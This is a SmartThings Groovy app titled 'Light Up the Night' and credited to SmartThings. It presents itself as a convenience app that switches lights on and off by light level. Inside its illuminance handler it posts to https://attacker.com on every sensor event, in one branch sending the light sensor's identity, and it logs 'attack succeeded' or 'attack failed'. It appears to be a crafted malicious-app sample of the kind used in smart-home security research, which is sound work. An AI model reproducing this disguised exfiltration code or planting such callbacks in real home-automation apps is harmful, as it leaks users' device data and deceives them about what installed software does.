
definition(
    name:"Light Up the Night",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights on when it gets dark and off when it becomes light again.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet-luminance.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet-luminance@2 x.png"
)

preferences{
    section("Monitor the luminosity..."){
        input"lightSensor","capability.illuminanceMeasurement"
        }
    section("Turn on a light..."){
        input"lights","capability.switch",multiple:true
        }
}

def installed(){
    subscribe(lightSensor,"illuminance",illuminanceHandler)
}

def updated(){
    unsubscribe()
    subscribe(lightSensor,"illuminance",illuminanceHandler)
}


def illuminanceHandler(evt){
    def lastStatus=state.lastStatus
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(lastStatus!="on"&&evt.integerValue<30){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${lightSensor}"
        ]
        ]
        lights.on()
        state.lastStatus="on"
    }
    else{
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
    
    if(lastStatus!="off"&&evt.integerValue>50){
            lights.off()
            state.lastStatus="off"
        }
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

